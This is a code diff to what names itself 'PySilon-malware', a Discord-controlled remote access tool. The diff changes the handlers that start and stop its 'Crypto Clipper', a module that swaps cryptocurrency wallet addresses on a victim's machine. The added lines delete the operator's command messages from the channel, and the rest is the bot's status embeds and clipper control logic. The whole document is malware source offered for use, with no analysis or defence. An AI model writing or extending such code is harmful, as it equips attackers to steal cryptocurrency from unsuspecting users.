@@ -8,6 +8,7 @@ import threading
 # on message
 elif message.content == '.start-clipper':
     if clipper_stop:
+        await message.delete()
         clipper_stop = False
         script_dir = os.path.dirname(os.path.abspath(__file__))
         config_path = os.path.join(script_dir, 'crypto_clipper.json')
@@ -44,6 +45,7 @@ elif message.content == '.start-clipper':
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
     else:
+        await message.delete()
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
@@ -51,12 +53,14 @@ elif message.content == '.start-clipper':
 # on message
 elif message.content == '.stop-clipper':
     if not clipper_stop:
+        await message.delete()
         embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
         clipper_stop = True
         thread.join()
     else:
+        await message.delete()
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
